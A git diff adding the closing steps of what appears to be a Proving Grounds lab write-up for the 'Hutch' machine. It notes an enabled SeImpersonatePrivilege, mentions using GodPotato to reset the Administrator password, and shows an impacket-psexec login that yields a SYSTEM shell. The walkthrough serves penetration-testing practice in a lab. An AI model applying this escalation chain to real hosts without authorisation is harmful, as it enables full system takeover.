@@ -1084,4 +1084,33 @@ PS C:\windows\system32\inetsrv>
 ```
 checking user privs, we can see `SeImpersonatePrivilege` is enabled. 
 
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/2b844f3b-ff8c-4d39-8b58-972ab2154a3c)
 
+using godpotato.exe to change administrator password. 
+
+```shell
+┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/PGP/Hutch]
+└─$ impacket-psexec Administrator@192.168.154.122                                                                           
+Impacket v0.12.0.dev1+20230909.154612.3beeda7 - Copyright 2023 Fortra
+
+Password:
+[*] Requesting shares on 192.168.154.122.....
+[*] Found writable share ADMIN$
+[*] Uploading file fQsYojmP.exe
+[*] Opening SVCManager on 192.168.154.122.....
+[*] Creating service VHfZ on 192.168.154.122.....
+[*] Starting service VHfZ.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.1637]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> whoami 
+nt authority\system
+
+C:\Windows\system32> 
+```
+login psexec as administrator 
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/c61ecb4f-d7f2-4b7d-8c6a-caa2b869d3a5)
+
+and we are through 🙂
